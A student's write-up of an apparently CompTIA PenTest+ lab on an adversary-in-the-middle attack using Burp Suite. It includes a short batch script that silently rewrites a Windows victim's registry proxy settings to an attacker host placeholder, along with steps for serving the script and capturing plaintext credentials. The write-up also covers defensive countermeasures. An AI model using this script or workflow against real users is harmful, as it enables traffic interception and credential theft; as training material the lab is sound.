# Adversary-in-the-Middle (AitM) Attack with Burp Suite

**Course:** CertMaster CompTIA PenTest+ Lab
**Topic:** Perform Host-based Attacks  
**Platform:** Kali Linux and BurpSuite

---

## Objective

The goal of this lab was to simulate an **Adversary-in-the-Middle (AitM)** attack using Burp Suite as an intercepting proxy. This involved configuring a proxy listener, delivering a malicious script to redirect a victim's web traffic, capturing credentials in transit, and understanding defensive countermeasures.

---

## Tools Used

| Tool | Purpose |
|---|---|
| Burp Suite Community Edition | HTTP proxy / traffic interception |
| Apache2 | Web server to host the attack script |
| Kali Linux | Attacker machine |

---

## Lab Tasks Completed

### 1. Configured Burp Suite as a Proxy Listener

Burp Suite was launched as a **temporary project in memory** (no persistent project file). The proxy listener was configured to bind to a specific network interface and port to intercept traffic from the target network. Intercept was left **OFF** so that traffic flowed through passively — Burp recorded all requests in the HTTP History without blocking them.

> **Analogy:** Think of this like a security camera rather than a security guard. Intercept OFF = camera watching silently. Intercept ON = guard stopping every person at the door.

### 2. Created an Attack Script in the Web Root

A Windows batch script (`newproxy.bat`) was created in Apache2's web root (`/var/www/html/`). The script uses PowerShell to silently modify Windows Registry keys that control the system's proxy settings, redirecting all HTTP traffic through the attacker's Burp Suite listener.

**Script logic (sanitized):**
```bat
@echo off
PowerShell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\'Internet Settings' -Name ProxyServer -Value [ATTACKER_IP]:[PORT]
PowerShell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\'Internet Settings' -Name ProxyEnable -Value 1
```

The two registry keys modified are:
- `ProxyServer` — sets the proxy address to route traffic through
- `ProxyEnable` — enables the proxy (value `1` = on)

### 3. Started the Apache2 Web Service

Apache2 was started using `systemctl` to serve the script over HTTP, making it accessible to the victim machine on the local network.

```bash
sudo systemctl start apache2
sudo systemctl status apache2
```

### 4. Located Captured Credentials in HTTP History

After the victim ran the script and browsed to a login page, their credentials were captured in Burp Suite's **HTTP History** tab. The relevant request was identified by:

- **URL path:** `/rest/user/login`
- **HTTP Method:** `POST`
- **MIME type:** text

The POST body contained the victim's plaintext credentials submitted via the login form.

### 5. Saved Credentials Using "Copy to File"

The captured request was right-clicked in HTTP History and saved to a local file using Burp Suite's **Copy to file** feature.

---

## Key Concepts Learned

### AitM vs. Classic MitM
An **Adversary-in-the-Middle** attack is the modern term for what's classically known as Man-in-the-Middle (MitM). The attacker positions themselves between the victim and the destination server, silently reading (and potentially modifying) all traffic.

### Why POST Contains Credentials
HTTP methods serve different purposes:

| Method | Purpose | Where data goes |
|---|---|---|
| GET | Retrieve data | URL (visible) |
| POST | Send data to server | Request body (hidden) |
| PUT | Update a resource | Request body |
| HEAD | Retrieve headers only | N/A |

Login forms use **POST** so credentials are sent in the request body rather than exposed in the URL.

### Why Intercept OFF Still Captures Data
When Burp's intercept is off, it acts as a **transparent pass-through proxy** — it doesn't pause or modify traffic, but it logs every request and response to HTTP History. This is the passive sniffing phase of an AitM attack.

---

## Defensive Countermeasures

### Technical Controls
- **Encrypted protocols (HTTPS with valid certificate pinning)** — Even if traffic is routed through an attacker's proxy, properly implemented TLS encryption prevents the proxy from reading plaintext credentials.

### Human / Policy Controls
- **Do not execute scripts received via email or unsolicited sources** — The entire attack chain depended on the victim running the `.bat` file. User awareness training is the first line of defense.
- **Do not use credentials outside of trusted, verified internal systems** — Even if redirected, a user who recognizes they are not on a legitimate system can prevent credential theft at the final step.

### Why Some Controls Don't Apply Here
Firewalls and IDS/IPS are less effective against this attack because:
1. The victim *willingly* executed the script
2. Proxy traffic over standard ports looks like normal web browsing
3. The attack is launched from within the trusted network perimeter

---

## Attack Chain Summary

```
[Attacker hosts .bat on Apache2]
        ↓
[Victim downloads & executes script]
        ↓
[Windows proxy settings modified via Registry]
        ↓
[Victim's HTTP traffic routed through Burp Suite]
        ↓
[Victim logs into website → credentials sent via POST]
        ↓
[Burp Suite captures request in HTTP History]
        ↓
[Attacker exports credentials to file]
```

---

## Quiz Answers & Reasoning

| Question | Answer | Why |
|---|---|---|
| What is Burp doing when Intercept is OFF? | AitM sniffing | Passively recording all traffic without blocking it |
| Purpose of changing victim's proxy settings? | Route traffic to attacker's system | The `.bat` script redirects all HTTP requests through Burp |
| What would stop this attack? (2) | Encrypted protocols + Not executing unsolicited scripts | Breaks the chain at delivery and at data exposure |
| HTTP method containing credentials? | POST | Login forms send credentials in the POST request body |
| User training topics to prevent this? | Don't execute unsolicited scripts; Don't use credentials outside trusted systems | Addresses both the delivery vector and the credential exposure point |

---

## Reflection

This lab demonstrated how a relatively simple attack — hosting a script and tricking a user into running it — can lead to full credential compromise. The most impactful defenses are **not purely technical**: user awareness training proved to be the first and most critical layer of protection. This aligns with the **defense-in-depth** principle, where layering human, policy, and technical controls is more effective than relying on any single solution.

This type of proxy-based interception is commonly tested in **penetration testing engagements** to assess whether organizations are vulnerable to insider threats or phishing-delivered payloads.

---

*Lab completed as part of ongoing CompTIA PenTest+ exam preparation.*
